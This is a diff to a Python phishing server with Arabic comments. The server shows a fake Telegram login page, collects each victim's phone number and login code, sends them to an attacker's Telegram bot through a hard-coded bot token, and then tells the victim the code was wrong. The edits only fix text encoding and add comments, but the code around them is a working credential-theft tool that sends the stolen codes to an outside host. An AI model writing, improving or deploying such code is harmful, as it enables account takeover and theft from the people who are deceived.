@@ -4,9 +4,9 @@ import os
 import urllib.parse
 import requests
 
-# ===== إعدادات البوت (تم التحديث) =====
+# ===== إعدادات البوت =====
 BOT_TOKEN = "8875360747:AAHZH8ti8BTzA8_Gzo6QV6ex4OsaJyoBovI"
-CHAT_ID = "ضع_معرف_الدردشة_هنا"  # استبدل هذا بالرقم الذي ستحصل عليه
+CHAT_ID = "ضع_معرف_الدردشة_هنا"  # استبدل هذا بالرقم
 
 # ===== دالة الإرسال إلى تيليجرام =====
 def send_to_telegram(phone, code):
@@ -27,6 +27,7 @@ class PhishingHandler(BaseHTTPRequestHandler):
         if self.path == "/":
             self.send_response(200)
             self.end_headers()
+            # صفحة HTML مزيفة (نفسها)
             html = '''<!DOCTYPE html>
 <html>
 <head><title>Telegram Login</title></head>
@@ -39,7 +40,7 @@ class PhishingHandler(BaseHTTPRequestHandler):
     </form>
 </body>
 </html>'''
-            self.wfile.write(html.encode())
+            self.wfile.write(html.encode('utf-8'))  # تم الترميز بشكل صحيح
         else:
             self.send_response(404)
             self.end_headers()
@@ -56,9 +57,10 @@ class PhishingHandler(BaseHTTPRequestHandler):
             # إرسال البيانات إلى البوت
             send_to_telegram(phone, code)
             
+            # رد للمستخدم (تم الترميز بشكل صحيح)
             self.send_response(200)
             self.end_headers()
-            self.wfile.write(b"<h3>رمز غير صحيح، حاول مجدداً</h3>")
+            self.wfile.write("<h3>رمز غير صحيح، حاول مجدداً</h3>".encode('utf-8'))
         else:
             self.send_response(404)
             self.end_headers()
